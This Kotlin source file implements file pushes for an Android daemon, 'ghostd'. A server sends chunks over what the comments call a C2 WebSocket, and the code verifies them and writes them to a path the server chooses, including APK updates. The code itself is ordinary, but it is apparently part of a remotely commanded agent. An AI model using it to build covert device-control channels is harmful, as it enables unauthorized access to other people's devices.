package com.tg.ghostd

import org.json.JSONObject
import java.io.File
import java.io.FileOutputStream
import java.nio.file.AtomicMoveNotSupportedException
import java.nio.file.Files
import java.nio.file.StandardCopyOption
import java.security.MessageDigest
import java.util.concurrent.CountDownLatch

/**
 * Incoming file transfer: `files put <path>` — accepts a file stream pushed
 * by the server over the C2 WebSocket and writes it to storage.
 *
 * Flow: the server sends cmd {"action":"files","args":["put","<dest>"]};
 * the command handler prepares a transfer ([prepare]) on the WebSocket thread
 * and BLOCKS on a worker ([await]) until the server's binary frames arrive (MediaBus framing: JSON header + b'\n' +
 * payload, header type "file_chunk" carries dest path + total len, final
 * "file_end" completes it — as text or as an empty framed binary message).
 * Returns bytes written + sha256 (and verifies sha256 when the server sent
 * one in file_end).
 *
 * Data is written to `<dest>.part` and atomically renamed on success.
 */
object FileReceiver {

    private const val PART_SUFFIX = ".part"

    /** Generous receive window — APKs and media can be hundreds of MB. */
    private const val RECEIVE_TIMEOUT_MS = 10 * 60_000L

    /** A push dies silently when the server gives up mid-transfer (operator
     *  timeout, socket drop, daemon restart). Without this the receiver slot
     *  stays "in progress" forever and every later `files put` is refused,
     *  which is exactly what wedged pushes after an interrupted update. */
    private const val IDLE_TIMEOUT_MS = 180_000L

    /** A transfer idle this long is dead: a new push may reclaim the slot. */
    private const val STALE_MS = 45_000L

    private val lock = Any()
    private var pending: Transfer? = null

    class Transfer internal constructor(
        val path: String,
        val cmdId: String,
        internal val owner: Any?
    ) {
        internal val latch = CountDownLatch(1)
        internal val temp = File(path + PART_SUFFIX)
        internal var out: FileOutputStream? = null
        internal var written = 0L
        internal var chunks = 0L
        internal var total = -1L
        internal var error: String? = null
        internal var sha256: String? = null
        /** Set once the transfer has succeeded or been failed/superseded. */
        internal var terminal = false
        internal var lastActivity = System.currentTimeMillis()
        internal val digest = MessageDigest.getInstance("SHA-256")
    }

    /**
     * Create the receive slot BEFORE the WebSocket callback returns.
     *
     * The server sends `files put` and immediately streams binary frames. If
     * slot creation is left to the worker thread, early chunks and even
     * file_end can be processed while pending==null and are lost forever.
     * CommandHandler therefore calls this synchronously on the WebSocket
     * thread, then only [await] runs on the worker.
     */
    fun prepare(path: String, cmdId: String, owner: Any?): Transfer {
        if (path.isBlank()) throw Exception("files put: missing destination path")
        synchronized(lock) {
            pending?.let { stale ->
                val idle = System.currentTimeMillis() - stale.lastActivity
                if (idle < STALE_MS) {
                    throw Exception("file transfer already in progress: ${stale.path}")
                }
                // Previous push died mid-stream (the server gave up): reclaim
                // the slot instead of refusing every later transfer forever.
                failLocked(stale, "superseded after ${idle / 1000}s with no data")
            }
            val t = Transfer(path, cmdId, owner)
            val parent = File(path).parentFile
            if (parent != null && !parent.exists()) parent.mkdirs()
            t.out = FileOutputStream(t.temp)
            pending = t
            return t
        }
    }

    /** Wait for a prepared transfer; safe to call after file_end arrived. */
    fun await(t: Transfer): JSONObject {
        val started = System.currentTimeMillis()
        while (true) {
            val ok = try {
                t.latch.await(2, java.util.concurrent.TimeUnit.SECONDS)
            } catch (_: InterruptedException) {
                Thread.currentThread().interrupt()
                fail(t, "interrupted")
                break
            }
            if (ok) break
            val now = System.currentTimeMillis()
            if (now - t.lastActivity > IDLE_TIMEOUT_MS) {
                fail(
                    t,
                    "stalled: no data for ${IDLE_TIMEOUT_MS / 1000}s " +
                        "(got ${t.written} of ${if (t.total < 0) "?" else t.total} bytes)"
                )
                break
            }
            if (now - started > RECEIVE_TIMEOUT_MS) {
                fail(
                    t,
                    "timed out after ${RECEIVE_TIMEOUT_MS / 1000}s " +
                        "(got ${t.written} of ${if (t.total < 0) "?" else t.total} bytes)"
                )
                break
            }
        }
        t.error?.let { throw Exception("files put: $it") }
        return JSONObject()
            .put("path", t.path)
            .put("bytes", t.written)
            .put("chunks", t.chunks)
            .put("sha256", t.sha256)
    }

    /** Binary/text file_chunk: header carries path + total len (+seq/len). */
    fun onChunk(header: JSONObject, payload: ByteArray) {
        synchronized(lock) {
            val t = pending ?: return
            if (t.error != null) return
            // Cross-wire guard: a server-side push whose `files put` was
            // rejected still streams chunks; they must NOT land in an
            // unrelated in-flight transfer (seen live: ghosta bytes renamed
            // over ghostd.apk). Chunk headers carry the intended path+cmd_id.
            if (header.optString("path") != t.path) return
            if (header.optString("cmd_id") != t.cmdId) return
            t.lastActivity = System.currentTimeMillis()
            try {
                val tot = header.optLong("total", -1)
                if (tot > 0) {
                    if (t.total > 0 && t.total != tot) {
                        failLocked(t, "total changed mid-transfer: was ${t.total}, got $tot")
                        return
                    }
                    t.total = tot
                }
                val out = t.out
                if (out == null) {
                    failLocked(t, "stream closed")
                    return
                }
                out.write(payload)
                t.digest.update(payload)
                t.written += payload.size
                t.chunks++
            } catch (e: Exception) {
                failLocked(t, "write failed: ${e.message}")
            }
        }
    }

    /** Final file_end (text message or empty framed binary). */
    fun onEnd(header: JSONObject) {
        synchronized(lock) {
            val t = pending ?: return
            if (t.error != null) return
            // Cross-wire guard (see onChunk): only accept file_end for OUR
            // exact path and cmd_id.
            if (header.optString("path") != t.path) return
            if (header.optString("cmd_id") != t.cmdId) return
            if (t.total > 0 && t.written != t.total) {
                failLocked(t, "size mismatch: got ${t.written} of ${t.total} bytes")
                return
            }
            val endBytes = header.optLong("bytes", -1)
            if (endBytes >= 0 && endBytes != t.written) {
                failLocked(t, "file_end bytes mismatch: got ${t.written} of $endBytes bytes")
                return
            }
            val endChunks = header.optLong("chunks", -1)
            if (endChunks >= 0 && endChunks != t.chunks) {
                failLocked(t, "file_end chunks mismatch: got ${t.chunks} of $endChunks chunks")
                return
            }
            val expected = header.optString("sha256")
            val got = FileTransfer.toHex(t.digest.digest())
            if (expected.isNotEmpty() && !expected.equals(got, ignoreCase = true)) {
                failLocked(t, "sha256 mismatch: expected $expected got $got")
                return
            }
            closeStream(t)
            val dest = File(t.path)
            try {
                Files.move(
                    t.temp.toPath(), dest.toPath(),
                    StandardCopyOption.ATOMIC_MOVE,
                    StandardCopyOption.REPLACE_EXISTING
                )
            } catch (_: AtomicMoveNotSupportedException) {
                try {
                    Files.move(
                        t.temp.toPath(), dest.toPath(),
                        StandardCopyOption.REPLACE_EXISTING
                    )
                } catch (e: Exception) {
                    failLocked(t, "rename to ${t.path} failed: ${e.message}")
                    return
                }
            } catch (e: Exception) {
                failLocked(t, "rename to ${t.path} failed: ${e.message}")
                return
            }
            t.sha256 = got
            t.terminal = true
            t.latch.countDown()
            pending = null
        }
    }

    // ---------------------------------------------------------- internal

    /**
     * Drop any half-received transfer (called on kick/restart and by
     * `files abort`). Prevents a dead server-side push from blocking every
     * later upload with "file transfer already in progress".
     */
    fun abortAll(reason: String): JSONObject {
        var aborted = false
        synchronized(lock) {
            val t = pending
            if (t != null) {
                failLocked(t, "aborted: $reason")
                aborted = true
            }
        }
        return JSONObject().put("ok", true).put("aborted", aborted)
    }

    /** Abort only the transfer owned by [owner] (e.g. one WebSocket). */
    fun abortOwner(owner: Any?, reason: String): JSONObject {
        var aborted = false
        synchronized(lock) {
            val t = pending
            if (t != null && t.owner === owner) {
                failLocked(t, "aborted: $reason")
                aborted = true
            }
        }
        return JSONObject().put("ok", true).put("aborted", aborted)
    }

    private fun fail(t: Transfer, msg: String) {
        synchronized(lock) { failLocked(t, msg) }
    }

    /** Caller holds [lock]. */
    private fun failLocked(t: Transfer, msg: String) {
        // Idempotent and identity-checked: an obsolete waiter (timeout or
        // interruption) must not fail a transfer that already completed or
        // was superseded. Only the live slot may delete its .part file, so a
        // replacement transfer on the same path is never disturbed.
        if (t.terminal) return
        t.terminal = true
        closeStream(t)
        if (pending === t) {
            t.temp.delete()
            pending = null
        }
        t.error = msg
        t.latch.countDown()
    }

    private fun closeStream(t: Transfer) {
        try {
            t.out?.close()
        } catch (_: Exception) {
        }
        t.out = null
    }
}
